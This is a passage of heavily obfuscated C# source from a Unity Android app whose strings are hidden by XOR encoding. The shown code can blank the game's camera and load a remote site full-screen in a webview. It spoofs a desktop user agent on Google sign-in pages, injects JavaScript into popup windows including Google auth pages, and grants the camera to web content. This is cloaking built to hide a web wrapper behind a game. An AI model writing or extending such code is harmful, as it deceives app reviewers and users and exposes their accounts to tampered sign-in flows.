        AndroidNotificationCenter.RegisterNotificationChannel(_0xb46947b1);
        // Build notification
        var _0x782084de = new AndroidNotification
        {
            Title = _0x03863b7b[UnityEngine.Random.Range(0, _0x03863b7b.Length)],
            Text = _0x85e40e1c._0x8a9d8fd6(new byte[21] { 141, 190, 169, 236, 181, 163, 185, 236, 191, 185, 190, 169, 236, 184, 163, 236, 169, 180, 165, 184, 243 }, 204),
            FireTime = System.DateTime.Now
        };
        // Send immediately
        AndroidNotificationCenter.SendNotification(_0x782084de, _0x85e40e1c._0x8a9d8fd6(new byte[15] { 183, 182, 181, 178, 166, 191, 167, 140, 176, 187, 178, 189, 189, 182, 191 }, 211));
    }

    private GameObject _0x0cc76f24;
    private bool _0xb044368c = false;
    public void _0x70f889de()
    {
        isDestroyedForce = true;
        StopAllCoroutines();
        {
#if B_LOGS
            Debug.Log(_0x85e40e1c._0x8a9d8fd6(new byte[18] { 44, 35, 18, 4, 3, 42, 87, 59, 22, 2, 25, 20, 31, 87, 48, 22, 26, 18 }, 119));
#endif
        }

        _0xe7cafbca.Instance?._0xce7b02e4();
        _0x086e6439.Instance._0x96213810(_0xab68611e._0x74dfb94c.DEFAULT);
    }

    private string _0xea9f1f55 = "";
    private string _0x2833a1a0 = "";
    private string _0xce3b6689 = "";
    private string _0x72616a4f = "";
    private IEnumerator RequestAndroidPermissionIfNeeded(string _0x19a0c997)
    {
        if (Permission.HasUserAuthorizedPermission(_0x19a0c997))
            yield break;
        bool _0x437ef08b = false;
        var _0xf106b832 = new PermissionCallbacks();
        _0xf106b832.PermissionGranted += _0x7672dff0 => _0x437ef08b = true;
        _0xf106b832.PermissionDenied += _0x7672dff0 => _0x437ef08b = true;
        Permission.RequestUserPermission(_0x19a0c997, _0xf106b832);
        yield return new WaitUntil(() => _0x437ef08b);
    }

    private async Task<bool> _0x9bda1bf9()
    {
        {
#if B_LOGS
            Debug.Log(_0x85e40e1c._0x8a9d8fd6(new byte[29] { 14, 1, 48, 38, 33, 8, 117, 28, 38, 5, 39, 60, 35, 52, 54, 44, 20, 59, 49, 6, 52, 35, 48, 49, 22, 61, 48, 54, 62 }, 85));
#endif
        }

        string _0x99656e32 = "";
        for (int _0x533f9acd = 0; _0x533f9acd < 2; _0x533f9acd++)
        {
            if (await _0x45bbc1cc(1, 100))
            {
                await _0x0749f803(_0x85e40e1c._0x8a9d8fd6(new byte[7] { 71, 73, 74, 70, 78, 64, 65 }, 37));
                _0x70f889de();
                return true;
            }

            _0x99656e32 = await _0x95ff0455(1, 100);
            if (!string.IsNullOrEmpty(_0x99656e32))
                break;
        }

        try
        {
            if (!string.IsNullOrEmpty(_0x99656e32))
            {
                if (!string.IsNullOrEmpty(_0x12e1abed))
                {
                    _0x99656e32 = _0x809202a1(_0x99656e32, _0x12e1abed);
                    {
#if B_LOGS
                        Debug.Log(_0x85e40e1c._0x8a9d8fd6(new byte[53] { 251, 244, 197, 211, 212, 253, 128, 227, 193, 195, 200, 197, 196, 128, 198, 201, 206, 193, 204, 245, 210, 204, 128, 215, 201, 212, 200, 128, 211, 197, 206, 196, 201, 196, 128, 66, 38, 50, 128, 211, 200, 207, 215, 128, 247, 197, 194, 246, 201, 197, 215, 154, 128 }, 160) + _0x99656e32);
#endif
                    }
                }
                else
                {
                    {
#if B_LOGS
                        Debug.Log(_0x85e40e1c._0x8a9d8fd6(new byte[39] { 123, 116, 69, 83, 84, 125, 0, 99, 65, 67, 72, 69, 68, 0, 70, 73, 78, 65, 76, 117, 82, 76, 0, 194, 166, 178, 0, 83, 72, 79, 87, 0, 119, 69, 66, 118, 73, 69, 87 }, 32));
#endif
                    }
                }

                _0x16b62f65 = true;
                _0xfb1316d9(_0x99656e32);
                return true;
            }

            return false;
        }
        catch (Exception e)
        {
            {
#if B_LOGS
                {
                    Debug.Log(_0x85e40e1c._0x8a9d8fd6(new byte[44] { 67, 76, 125, 107, 108, 69, 56, 93, 96, 123, 125, 104, 108, 113, 119, 118, 56, 111, 112, 113, 116, 125, 56, 123, 112, 125, 123, 115, 113, 118, 127, 56, 107, 121, 110, 125, 124, 56, 116, 113, 118, 115, 34, 56 }, 24) + e.Message);
                }
#endif
            }

            return true;
        }
    }

    private bool _0xa2cb4ecc()
    {
        if (_0xcb5ea266())
            return true;
        if (_0x3053905e != null && _0x3053905e.CanGoBack)
        {
            WLog(_0x85e40e1c._0x8a9d8fd6(new byte[36] { 129, 168, 187, 173, 190, 168, 187, 172, 233, 171, 168, 170, 162, 233, 228, 247, 233, 164, 168, 160, 167, 233, 158, 172, 171, 159, 160, 172, 190, 233, 142, 166, 139, 168, 170, 162 }, 201));
            _0x3053905e.GoBack();
            return true;
        }

        return false;
    }

    private string _0xea92aa99 = "";
    private void _0xc43816cd(string _0x19dcc8c0)
    {
        {
            {
#if B_LOGS
                Debug.Log(_0x85e40e1c._0x8a9d8fd6(new byte[34] { 173, 162, 147, 133, 130, 171, 214, 176, 147, 130, 149, 158, 214, 179, 142, 130, 132, 151, 214, 166, 131, 133, 158, 214, 178, 151, 130, 151, 214, 164, 151, 129, 204, 214 }, 246) + _0x19dcc8c0);
#endif
            }
        }

        var _0xfc07d5ea = JsonConvert.DeserializeObject<Dictionary<string, object>>(_0x19dcc8c0);
        StartCoroutine(_0xd5385cca(_0xfc07d5ea));
    }

    private bool _0x7967eec2 = false;
    private async Task<bool> _0x19dcb358()
    {
        {
#if B_LOGS
            Debug.Log(_0x85e40e1c._0x8a9d8fd6(new byte[37] { 200, 199, 246, 224, 231, 206, 179, 192, 250, 244, 253, 218, 253, 198, 253, 250, 231, 234, 192, 246, 225, 229, 250, 240, 246, 224, 210, 253, 252, 253, 234, 254, 252, 230, 224, 255, 234 }, 147));
#endif
        }

        try
        {
            var _0x9abbc630 = new InitializationOptions();
            await UnityServices.InitializeAsync(_0x9abbc630);
            {
#if B_LOGS
                Debug.Log(_0x85e40e1c._0x8a9d8fd6(new byte[32] { 169, 166, 151, 129, 134, 175, 210, 167, 156, 155, 134, 139, 161, 151, 128, 132, 155, 145, 151, 129, 210, 187, 156, 155, 134, 155, 147, 158, 155, 136, 151, 150 }, 242));
#endif
            }
        }
        catch (Exception ex)
        {
            {
#if B_LOGS
                Debug.Log(_0x85e40e1c._0x8a9d8fd6(new byte[20] { 122, 107, 125, 122, 14, 123, 64, 71, 90, 87, 125, 75, 92, 88, 71, 77, 75, 93, 20, 14 }, 46) + ex.Message);
#endif
            }

            _0x20d63bf4?._0x70f889de();
            return true;
        }

        bool _0x9d093a3c = false;
        do
        {
            try
            {
                await AuthenticationService.Instance.SignInAnonymouslyAsync();
                _0x9d093a3c = true;
                {
                    {
#if B_LOGS
                        Debug.Log(_0x85e40e1c._0x8a9d8fd6(new byte[37] { 200, 199, 246, 224, 231, 206, 179, 192, 250, 244, 253, 190, 250, 253, 179, 210, 253, 252, 253, 234, 254, 252, 230, 224, 189, 179, 195, 255, 242, 234, 246, 225, 179, 218, 215, 169, 179 }, 147) + AuthenticationService.Instance.PlayerId);
#endif
                    }

                    _0x8a05b7f7 = AuthenticationService.Instance.PlayerId;
                }
            }
            catch (AuthenticationException ex)
            {
                {
#if B_LOGS
                    Debug.Log(_0x85e40e1c._0x8a9d8fd6(new byte[25] { 108, 125, 107, 108, 24, 107, 81, 95, 86, 21, 81, 86, 24, 121, 77, 76, 80, 24, 125, 106, 106, 119, 106, 2, 24 }, 56) + ex.Message);
#endif
                }

                _0x20d63bf4?._0x70f889de();
                return true;
            }
            catch (RequestFailedException ex)
            {
                {
#if B_LOGS
                    Debug.Log(_0x85e40e1c._0x8a9d8fd6(new byte[28] { 245, 228, 242, 245, 129, 242, 200, 198, 207, 140, 200, 207, 129, 243, 196, 208, 212, 196, 210, 213, 129, 228, 243, 243, 238, 243, 155, 129 }, 161) + ex.Message);
#endif
                }

                _0x20d63bf4?._0x70f889de();
                return true;
            }
        }
        while (!_0x9d093a3c);
        return false;
    }

    private void _0x43224768(UniWebView _0x4afbb458)
    {
        if (_0x3b60e40c)
            return;
        _0x3b60e40c = true;
        _0x4afbb458.AddUrlScheme(_0x85e40e1c._0x8a9d8fd6(new byte[2] { 99, 112 }, 23));
        _0x4afbb458.AddUrlScheme(_0x85e40e1c._0x8a9d8fd6(new byte[6] { 41, 46, 52, 37, 46, 52 }, 64));
        _0x4afbb458.AddUrlScheme(_0x85e40e1c._0x8a9d8fd6(new byte[6] { 184, 180, 167, 190, 176, 161 }, 213));
        _0x4afbb458.OnMessageReceived += (_0x9c4ffb3c, _0x9f6dc057) =>
        {
            if (TryOpenExternalLikeChrome(_0x9f6dc057.RawMessage))
            {
                _0xc2e5068c(false);
                return;
            }
        };
        _0x4afbb458.RegisterShouldHandleRequest(_0x228ad662 =>
        {
            string _0x840d0117 = _0x228ad662 != null ? _0x228ad662.Url : string.Empty;
            if (string.IsNullOrEmpty(_0x840d0117))
                return true;
            WLog(_0x85e40e1c._0x8a9d8fd6(new byte[21] { 158, 165, 162, 184, 161, 169, 133, 172, 163, 169, 161, 168, 159, 168, 188, 184, 168, 190, 185, 247, 237 }, 205) + _0x840d0117);
            if (TryOpenExternalLikeChrome(_0x840d0117))
            {
                _0xc2e5068c(false);
                return false;
            }

            if (_0x228ad662 != null && _0x228ad662.IsMainFrame && IsGoogleAuthFlowUrl(_0x840d0117) && !_0x8b31787f)
            {
                WLog(_0x85e40e1c._0x8a9d8fd6(new byte[62] { 91, 119, 127, 120, 54, 65, 115, 116, 64, 127, 115, 97, 54, 114, 115, 98, 115, 117, 98, 115, 114, 54, 81, 121, 121, 113, 122, 115, 54, 119, 99, 98, 126, 54, 67, 68, 90, 54, 59, 40, 54, 100, 115, 122, 121, 119, 114, 54, 97, 127, 98, 126, 54, 81, 121, 121, 113, 122, 115, 54, 67, 87 }, 22));
                _0x8b31787f = true;
                _0xc2e5068c(true);
                _0x3053905e.SetUserAgent(_0xba975fa4());
                _0x3053905e.Load(_0x840d0117);
                return false;
            }

            return true;
        });
        _0x4afbb458.OnLoadingErrorReceived += (_0x9c4ffb3c, _0x51383452, _0x9f6dc057, _0x9f2fb16e) =>
        {
            WLog(_0x85e40e1c._0x8a9d8fd6(new byte[25] { 28, 48, 56, 63, 113, 6, 52, 51, 7, 56, 52, 38, 113, 20, 35, 35, 62, 35, 107, 113, 50, 62, 53, 52, 108 }, 81) + _0x51383452 + _0x85e40e1c._0x8a9d8fd6(new byte[9] { 73, 4, 12, 26, 26, 8, 14, 12, 84 }, 105) + _0x9f6dc057);
            string _0xd133554c = GetFailingUrl(_0x9f2fb16e);
            if (string.IsNullOrEmpty(_0xd133554c) || IsAboutBlank(_0xd133554c))
                return;
            _ = _0x0749f803(_0x85e40e1c._0x8a9d8fd6(new byte[8] { 58, 59, 18, 40, 63, 63, 34, 63 }, 77));
            WLog(_0x85e40e1c._0x8a9d8fd6(new byte[45] { 46, 2, 10, 13, 67, 52, 6, 1, 53, 10, 6, 20, 67, 5, 2, 10, 15, 10, 13, 4, 67, 54, 49, 47, 67, 78, 93, 67, 12, 19, 6, 13, 67, 6, 27, 23, 6, 17, 13, 2, 15, 15, 26, 89, 67 }, 99) + _0xd133554c);
            StopCurrentFailedLoad(_0x9c4ffb3c);
            _0x726cb5dc(_0xd133554c);
        };
        _0x4afbb458.OnPageStarted += (_0x9c4ffb3c, _0x0c044f61) =>
        {
            _0x7d2322a1 = 0;
            if (_0x7967eec2 && IsAboutBlank(_0x0c044f61))
            {
                WLog(_0x85e40e1c._0x8a9d8fd6(new byte[27] { 129, 163, 180, 166, 176, 163, 188, 241, 176, 179, 190, 164, 165, 235, 179, 189, 176, 191, 186, 241, 162, 165, 176, 163, 165, 180, 181 }, 209));
                return;
            }

            WLog(_0x85e40e1c._0x8a9d8fd6(new byte[29] { 220, 240, 248, 255, 177, 198, 244, 243, 199, 248, 244, 230, 177, 222, 255, 193, 240, 246, 244, 194, 229, 240, 227, 229, 244, 245, 171, 177, 186 }, 145) + (Time.realtimeSinceStartup - _0x4fff9674).ToString(_0x85e40e1c._0x8a9d8fd6(new byte[5] { 2, 28, 2, 2, 2 }, 50)) + _0x85e40e1c._0x8a9d8fd6(new byte[2] { 170, 249 }, 217) + _0x0c044f61);
            if (TryOpenExternalLikeChrome(_0x0c044f61))
            {
                StopCurrentFailedLoad(_0x9c4ffb3c);
                return;
            }

            if (ContainsIgnoreCase(_0x0c044f61, _0x85e40e1c._0x8a9d8fd6(new byte[8] { 128, 141, 141, 133, 202, 133, 148, 148 }, 228)) || ContainsIgnoreCase(_0x0c044f61, _0x85e40e1c._0x8a9d8fd6(new byte[15] { 252, 237, 245, 162, 251, 229, 232, 235, 233, 248, 162, 238, 224, 227, 235 }, 140)) || _0x0c044f61.StartsWith(_0x85e40e1c._0x8a9d8fd6(new byte[25] { 7, 27, 27, 31, 28, 85, 64, 64, 13, 31, 8, 3, 0, 13, 14, 3, 9, 14, 25, 65, 3, 6, 25, 10, 64 }, 111), StringComparison.OrdinalIgnoreCase))
            {
                StopCurrentFailedLoad(_0x9c4ffb3c);
                OpenUrlExternally(_0x0c044f61);
                return;
            }

            if (IsGoogleAuthFlowUrl(_0x0c044f61))
            {
                _0xc2e5068c(true);
                WLog(_0x85e40e1c._0x8a9d8fd6(new byte[41] { 117, 93, 93, 85, 94, 87, 18, 83, 71, 70, 90, 18, 84, 94, 93, 69, 18, 86, 87, 70, 87, 81, 70, 87, 86, 18, 31, 12, 18, 89, 87, 87, 66, 18, 68, 91, 65, 91, 80, 94, 87 }, 50));
                return;
            }

            _0x571abd6a = true;
            _0xc2e5068c(true);
            WLog(_0x85e40e1c._0x8a9d8fd6(new byte[43] { 131, 177, 182, 130, 189, 177, 163, 244, 184, 187, 181, 176, 189, 186, 179, 251, 166, 177, 176, 189, 166, 177, 183, 160, 189, 186, 179, 244, 249, 234, 244, 191, 177, 177, 164, 244, 162, 189, 167, 189, 182, 184, 177 }, 212));
        };
        _0x4afbb458.OnPageCommitted += (_0x9c4ffb3c, _0x0c044f61) =>
        {
            if (_0x7967eec2 && IsAboutBlank(_0x0c044f61))
                return;
            WLog(_0x85e40e1c._0x8a9d8fd6(new byte[31] { 233, 197, 205, 202, 132, 243, 193, 198, 242, 205, 193, 211, 132, 235, 202, 244, 197, 195, 193, 231, 203, 201, 201, 205, 208, 208, 193, 192, 158, 132, 143 }, 164) + (Time.realtimeSinceStartup - _0x4fff9674).ToString(_0x85e40e1c._0x8a9d8fd6(new byte[5] { 145, 143, 145, 145, 145 }, 161)) + _0x85e40e1c._0x8a9d8fd6(new byte[2] { 159, 204 }, 236) + _0x0c044f61);
            if (!firstLoadShown && IsHttpUrl(_0x0c044f61))
            {
                firstLoadShown = true;
                _0x571abd6a = false;
                _0xc2e5068c(false);
                _0xce3db8b5();
                _0x9c4ffb3c.Show(false, UniWebViewTransitionEdge.None, 0f, null);
                _ = _0x0749f803(_0x85e40e1c._0x8a9d8fd6(new byte[9] { 172, 173, 132, 180, 171, 190, 181, 190, 191 }, 219));
                WLog(_0x85e40e1c._0x8a9d8fd6(new byte[39] { 14, 34, 42, 45, 99, 20, 38, 33, 21, 42, 38, 52, 99, 48, 43, 44, 52, 45, 99, 44, 45, 99, 32, 44, 46, 46, 42, 55, 55, 38, 39, 99, 32, 44, 45, 55, 38, 45, 55 }, 67));
            }
        };
        _0x4afbb458.OnPageProgressChanged += (_0x9c4ffb3c, _0x782477d7) =>
        {
            if (_0x7967eec2)
                return;
            if (!firstLoadShown && _0x782477d7 >= 0.65f)
            {
                firstLoadShown = true;
                _0x571abd6a = false;
                _0xc2e5068c(false);
                _0xce3db8b5();
                _0x9c4ffb3c.Show(false, UniWebViewTransitionEdge.None, 0f, null);
                _ = _0x0749f803(_0x85e40e1c._0x8a9d8fd6(new byte[9] { 27, 26, 51, 3, 28, 9, 2, 9, 8 }, 108));
                WLog(_0x85e40e1c._0x8a9d8fd6(new byte[32] { 213, 249, 241, 246, 184, 207, 253, 250, 206, 241, 253, 239, 184, 235, 240, 247, 239, 246, 184, 250, 225, 184, 232, 234, 247, 255, 234, 253, 235, 235, 162, 184 }, 152) + _0x782477d7);
            }
        };
        _0x4afbb458.OnPageFinished += (_0x9c4ffb3c, _0x51383452, _0x0c044f61) =>
        {
            if (_0x7967eec2 && IsAboutBlank(_0x0c044f61))
            {
                _0x7967eec2 = false;
                WLog(_0x85e40e1c._0x8a9d8fd6(new byte[28] { 45, 15, 24, 10, 28, 15, 16, 93, 28, 31, 18, 8, 9, 71, 31, 17, 28, 19, 22, 93, 27, 20, 19, 20, 14, 21, 24, 25 }, 125));
                return;
            }

            WLog(_0x85e40e1c._0x8a9d8fd6(new byte[24] { 224, 204, 196, 195, 141, 250, 200, 207, 251, 196, 200, 218, 141, 235, 196, 195, 196, 222, 197, 200, 201, 151, 141, 134 }, 173) + (Time.realtimeSinceStartup - _0x4fff9674).ToString(_0x85e40e1c._0x8a9d8fd6(new byte[5] { 80, 78, 80, 80, 80 }, 96)) + _0x85e40e1c._0x8a9d8fd6(new byte[7] { 194, 145, 210, 222, 213, 212, 140 }, 177) + _0x51383452 + _0x85e40e1c._0x8a9d8fd6(new byte[5] { 51, 102, 97, 127, 46 }, 19) + _0x0c044f61);
            if (!firstLoadShown)
            {
                firstLoadShown = true;
                _0x571abd6a = false;
                _0xc2e5068c(false);
                _0xce3db8b5();
                _0x9c4ffb3c.Show(false, UniWebViewTransitionEdge.None, 0f, null);
                _ = _0x0749f803(_0x85e40e1c._0x8a9d8fd6(new byte[9] { 71, 70, 111, 95, 64, 85, 94, 85, 84 }, 48));
                WLog(_0x85e40e1c._0x8a9d8fd6(new byte[33] { 44, 0, 8, 15, 65, 54, 4, 3, 55, 8, 4, 22, 65, 7, 8, 19, 18, 21, 65, 13, 14, 0, 5, 65, 2, 14, 12, 17, 13, 4, 21, 4, 5 }, 97));
            }
            else if (_0x571abd6a)
            {
                _0x571abd6a = false;
                _0xc2e5068c(false);
                _0x9c4ffb3c.Show(false, UniWebViewTransitionEdge.None, 0f, null);
                WLog(_0x85e40e1c._0x8a9d8fd6(new byte[40] { 37, 9, 1, 6, 72, 63, 13, 10, 62, 1, 13, 31, 72, 59, 0, 7, 31, 72, 9, 14, 28, 13, 26, 72, 4, 7, 9, 12, 1, 6, 15, 72, 14, 1, 6, 1, 27, 0, 13, 12 }, 104));
            }
            else
            {
                _0xc2e5068c(false);
            }

            if (_0x8b31787f && !IsGoogleAuthFlowUrl(_0x0c044f61) && !IsGoogleAuthFlowUrl(_0x0c044f61))
            {
                WLog(_0x85e40e1c._0x8a9d8fd6(new byte[48] { 6, 46, 46, 38, 45, 36, 97, 32, 52, 53, 41, 97, 50, 36, 36, 44, 50, 97, 39, 40, 47, 40, 50, 41, 36, 37, 97, 108, 127, 97, 51, 36, 50, 53, 46, 51, 36, 97, 37, 36, 39, 32, 52, 45, 53, 97, 20, 0 }, 65));
                _0x8b31787f = false;
                _0x3053905e.SetUserAgent("");
            }
        };
        _0x4afbb458.OnShouldClose += _0x9c4ffb3c =>
        {
            WLog(_0x85e40e1c._0x8a9d8fd6(new byte[41] { 169, 166, 151, 129, 134, 175, 210, 191, 147, 155, 156, 210, 165, 151, 144, 164, 155, 151, 133, 210, 189, 156, 161, 154, 157, 135, 158, 150, 177, 158, 157, 129, 151, 210, 155, 156, 132, 157, 153, 151, 150 }, 242));
            _0x8631a3c2();
            return false;
        };
        // POPUP HANDLING LOGIC
        _0x4afbb458.SetPopupPageEventEnabled(true);
        bool _0x6fa8d000 = false;
        bool _0x8e9988ba = false;
        _0x4afbb458.OnMultipleWindowOpened += (_0x9c4ffb3c, _0x7110eb84) =>
        {
            _0x9c4ffb3c.ScrollTo(0, 0, false);
            WLog(_0x85e40e1c._0x8a9d8fd6(new byte[43] { 4, 11, 58, 44, 43, 2, 127, 18, 62, 54, 49, 127, 8, 58, 61, 9, 54, 58, 40, 127, 18, 42, 51, 43, 54, 47, 51, 58, 8, 54, 49, 59, 48, 40, 127, 16, 47, 58, 49, 58, 59, 101, 127 }, 95) + _0x7110eb84);
            var _0x3b1c9b01 = _0x4afbb458.GetPopupWindow(_0x7110eb84);
            if (_0x3b1c9b01 == null)
                return;
            _0x6e32f3ba.Add(_0x3b1c9b01);
            Debug.Log($"[Test] Popup ID: {_0x3b1c9b01.Id}");
            _0x3b1c9b01.OnPageStarted += (_0xc6605589, _0x0c044f61) =>
            {
                WLog(_0x85e40e1c._0x8a9d8fd6(new byte[36] { 85, 90, 107, 125, 122, 83, 46, 94, 97, 126, 123, 126, 46, 89, 107, 108, 88, 103, 107, 121, 46, 65, 96, 94, 111, 105, 107, 93, 122, 111, 124, 122, 107, 106, 52, 46 }, 14) + _0x0c044f61);
                _0x7d2322a1 = 0;
                if (string.IsNullOrEmpty(_0x0c044f61) || IsAboutBlank(_0x0c044f61))
                    return;
                if (IsGoogleAuthFlowUrl(_0x0c044f61))
                {
                    WLog(_0x85e40e1c._0x8a9d8fd6(new byte[57] { 176, 191, 142, 152, 159, 182, 203, 187, 132, 155, 158, 155, 203, 172, 132, 132, 140, 135, 142, 203, 138, 158, 159, 131, 203, 141, 135, 132, 156, 203, 198, 213, 203, 152, 155, 132, 132, 141, 203, 172, 132, 132, 140, 135, 142, 203, 168, 131, 153, 132, 134, 142, 203, 190, 170, 209, 203 }, 235) + _0x0c044f61);
                    _0x6fa8d000 = false;
                    _0x3702ba62();
                    if (_0xc6605589 != null && _0xc6605589.IsAlive)
                        _0xc6605589.EvaluateJavaScript(_0x137134ef());
                    return;
                }

                if (_0x3053905e == null)
                    return;
                if (!_0x6fa8d000)
                {
                    _0x6fa8d000 = true;
                    _0x3053905e.SetUserAgent(WindowsDesktopUserAgent);
                    WLog(_0x85e40e1c._0x8a9d8fd6(new byte[39] { 212, 219, 234, 252, 251, 210, 175, 223, 224, 255, 250, 255, 175, 238, 255, 255, 227, 246, 175, 216, 230, 225, 235, 224, 248, 252, 175, 235, 234, 252, 228, 251, 224, 255, 175, 218, 206, 181, 175 }, 143) + _0x0c044f61);
                }

                if (_0xc6605589 != null && _0xc6605589.IsAlive)
                    _0xc6605589.EvaluateJavaScript(_0x2102bd9a());
                if (!_0x8e9988ba && _0xc6605589 != null && _0xc6605589.IsAlive && IsHttpUrl(_0x0c044f61))
                {
                    _0x8e9988ba = true;
                }
            };
            _0x3b1c9b01.OnPageFinished += (_0xc6605589, _0x9f2fb16e) =>
            {
                string _0x5a50f638 = _0x9f2fb16e != null ? _0x9f2fb16e.data : string.Empty;
                WLog(_0x85e40e1c._0x8a9d8fd6(new byte[35] { 32, 47, 30, 8, 15, 38, 91, 43, 20, 11, 14, 11, 91, 44, 30, 25, 45, 18, 30, 12, 91, 61, 18, 21, 18, 8, 19, 30, 31, 65, 91, 14, 9, 23, 70 }, 123) + _0x5a50f638);
                if (_0xc6605589 == null || !_0xc6605589.IsAlive)
                    return;
                if (IsGoogleAuthFlowUrl(_0x5a50f638))
                {
                    _0x3702ba62();
                    _0xc6605589.EvaluateJavaScript(_0x137134ef());
                    return;
                }

                if (!_0x6fa8d000)
                    return;
                _0xc6605589.EvaluateJavaScript(_0x2102bd9a());
            };
        };
        _0x4afbb458.OnMultipleWindowClosed += (_0x9c4ffb3c, _0x7110eb84) =>
        {
            _0x6e32f3ba.RemoveAll(_0x2b332c97 => _0x2b332c97 == null || _0x2b332c97.Id == _0x7110eb84 || !_0x2b332c97.IsAlive);
            _0xc2e5068c(false);
            if (_0x6e32f3ba.Count == 0 && _0x3053905e != null)
            {
                _0x6fa8d000 = false;
                _0x8e9988ba = false;
                _0x21a40d0f();
            }

            WLog(_0x85e40e1c._0x8a9d8fd6(new byte[43] { 49, 62, 15, 25, 30, 55, 74, 39, 11, 3, 4, 74, 61, 15, 8, 60, 3, 15, 29, 74, 39, 31, 6, 30, 3, 26, 6, 15, 61, 3, 4, 14, 5, 29, 74, 41, 6, 5, 25, 15, 14, 80, 74 }, 106) + _0x7110eb84);
        };
        _0x4afbb458.RegisterOnRequestMediaCapturePermission(_0x228ad662 =>
        {
            if (!Permission.HasUserAuthorizedPermission(Permission.Camera))
            {
                Permission.RequestUserPermission(Permission.Camera);
                return UniWebViewMediaCapturePermissionDecision.Prompt;
            }

            return UniWebViewMediaCapturePermissionDecision.Grant;
        });
    }

    private bool _0x3f68adbc(string _0x9f89cf27)
    {
        try
        {
            using (var _0x5a87b294 = new AndroidJavaClass(_0x85e40e1c._0x8a9d8fd6(new byte[30] { 73, 69, 71, 4, 95, 68, 67, 94, 83, 25, 78, 4, 90, 70, 75, 83, 79, 88, 4, 127, 68, 67, 94, 83, 122, 70, 75, 83, 79, 88 }, 42)))
            using (var _0x017d8936 = _0x5a87b294.GetStatic<AndroidJavaObject>(_0x85e40e1c._0x8a9d8fd6(new byte[15] { 146, 132, 131, 131, 148, 159, 133, 176, 146, 133, 152, 135, 152, 133, 136 }, 241)))
            using (var _0xd4da8f9b = new AndroidJavaClass(_0x85e40e1c._0x8a9d8fd6(new byte[15] { 50, 61, 55, 33, 60, 58, 55, 125, 61, 54, 39, 125, 6, 33, 58 }, 83)))
            using (var _0xb24b0738 = _0xd4da8f9b.CallStatic<AndroidJavaObject>(_0x85e40e1c._0x8a9d8fd6(new byte[5] { 127, 110, 125, 124, 106 }, 15), _0x9f89cf27))
            using (var _0x4f730a2a = new AndroidJavaObject(_0x85e40e1c._0x8a9d8fd6(new byte[22] { 140, 131, 137, 159, 130, 132, 137, 195, 142, 130, 131, 153, 136, 131, 153, 195, 164, 131, 153, 136, 131, 153 }, 237), _0x85e40e1c._0x8a9d8fd6(new byte[26] { 95, 80, 90, 76, 81, 87, 90, 16, 87, 80, 74, 91, 80, 74, 16, 95, 93, 74, 87, 81, 80, 16, 104, 119, 123, 105 }, 62), _0xb24b0738))
            {
                WLog(_0x85e40e1c._0x8a9d8fd6(new byte[26] { 167, 140, 150, 139, 137, 129, 168, 141, 143, 129, 196, 139, 148, 129, 138, 196, 129, 156, 144, 129, 150, 138, 133, 136, 222, 196 }, 228) + _0x9f89cf27);
                _0x4f730a2a.Call<AndroidJavaObject>(_0x85e40e1c._0x8a9d8fd6(new byte[11] { 10, 15, 15, 40, 10, 31, 14, 12, 4, 25, 18 }, 107), _0x85e40e1c._0x8a9d8fd6(new byte[33] { 68, 75, 65, 87, 74, 76, 65, 11, 76, 75, 81, 64, 75, 81, 11, 70, 68, 81, 64, 66, 74, 87, 92, 11, 103, 119, 106, 114, 118, 100, 103, 105, 96 }, 37));
                _0x4f730a2a.Call<AndroidJavaObject>(_0x85e40e1c._0x8a9d8fd6(new byte[8] { 160, 165, 165, 135, 173, 160, 166, 178 }, 193), 0x10000000);
                _0x017d8936.Call(_0x85e40e1c._0x8a9d8fd6(new byte[13] { 42, 45, 56, 43, 45, 24, 58, 45, 48, 47, 48, 45, 32 }, 89), _0x4f730a2a);
                return true;
            }
        }
        catch (Exception e)
        {
            WLog(_0x85e40e1c._0x8a9d8fd6(new byte[28] { 173, 134, 156, 129, 131, 139, 162, 135, 133, 139, 206, 139, 150, 154, 139, 156, 128, 143, 130, 206, 136, 143, 135, 130, 139, 138, 212, 206 }, 238) + e.Message);
            Application.OpenURL(_0x9f89cf27);
            return true;
        }
    }

    private bool OpenUrlExternally(string _0x019a6958)
    {
        return _0x3f68adbc(_0x019a6958);
    }

    private IEnumerator _0xb76278d2(string _0x7943c9fe)
    {
        if (_0x3053905e != null && _0xacdd5220)
            yield break;
        _0x3053905e = gameObject.AddComponent<UniWebView>();
        _0x1c0fe411(_0x3053905e);
        _0x43224768(_0x3053905e);
        _0x3053905e.BackgroundColor = Color.clear;
        var _0xcd46704d = SceneManager.GetActiveScene().GetRootGameObjects();
        var _0xd4decb7b = Camera.main;
        if (Camera.main != null)
        {
            Camera.main.cullingMask = 0;
            Camera.main.clearFlags = CameraClearFlags.SolidColor;
            Camera.main.backgroundColor = Color.black;
            yield return new WaitForEndOfFrame();
        }

        yield return new WaitForEndOfFrame();
        _0xce3db8b5();
        yield return new WaitForEndOfFrame();
        _0xacdd5220 = true;
        _0x61f67c34();
        _0xc2e5068c(true);
        _0x7967eec2 = false;
        _0x8b31787f = false;
        _0x6e32f3ba.Clear();
        _0x1464989c = -1;
        firstLoadShown = false;
        _0x571abd6a = false;
        _0xb044368c = false;
        _0x3053905e.SetUserAgent("");
        _0x4fff9674 = Time.realtimeSinceStartup;
        _0x3053905e.Stop();
        _0x3053905e.Load(_0x7943c9fe);
        _0x3053905e.Show(false, UniWebViewTransitionEdge.None, 0f, null);
        WLog(_0x85e40e1c._0x8a9d8fd6(new byte[25] { 216, 244, 252, 251, 181, 194, 240, 247, 195, 252, 240, 226, 181, 220, 251, 252, 225, 252, 244, 249, 181, 198, 253, 250, 226 }, 149));
    }

    private AndroidJavaObject _0x399f3f41 { get; set; }

    private int _0xdf4abdf2 = 5, _0x85647120 = 5, _0xbf7ee752 = 5, _0xe5b4c575 = 5;
    private async Task _0x44f6afb1()
    {
        {
#if B_LOGS
            Debug.Log($"[Test] Send click");
#endif
        }

        _0x49df4396 = _0x85e40e1c._0x8a9d8fd6(new byte[5] { 210, 213, 216, 199, 209 }, 180);
        _0xce3b6689 = /*IsRunningOnEmulator() ? "running" :*/ "";
        _0x80d3442e = DateTime.UtcNow.Ticks.ToString();
        _0x53d9d738 = "";
